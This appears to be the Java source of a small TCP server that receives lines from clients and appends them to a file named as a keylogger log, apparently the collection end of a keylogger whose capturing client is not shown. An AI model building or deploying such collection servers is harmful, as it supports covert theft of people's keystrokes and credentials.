package Server;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;

public class Server {
    public static void main(String argv[]) throws Exception {
        String clientSentence;
        FileWriter fileWriter;
        ServerSocket welcomeSocket = new ServerSocket(6789);
        while (true) {
            Socket connectionSocket = welcomeSocket.accept();

            try (BufferedReader inFromClient = new BufferedReader(
                    new InputStreamReader(connectionSocket.getInputStream()));)
            {
                clientSentence = inFromClient.readLine();
                fileWriter = new FileWriter("E:\\ClientKeylogger\\newKeyLogger.txt",true);
                fileWriter.append(clientSentence);
                fileWriter.close();
                System.out.println("Client String = " + clientSentence);
            } catch (IOException e) {

            }
        }
    }
}
